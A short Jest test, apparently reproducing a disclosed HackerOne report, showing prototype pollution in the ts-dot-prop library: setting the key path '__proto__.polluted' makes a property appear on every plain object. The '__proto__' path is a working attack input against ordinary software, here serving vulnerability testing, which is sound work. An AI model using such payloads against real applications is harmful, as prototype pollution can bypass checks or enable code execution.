//https://hackerone.com/reports/980599
test("prototype pollution in ts-dot-prop", () => {
  const tsDot = require("ts-dot-prop");

  let obj = {};
  expect({}.polluted).toBe(undefined);

  tsDot.set(obj, "__proto__.polluted", "yes");
  expect({}.polluted).toBe("yes");
});
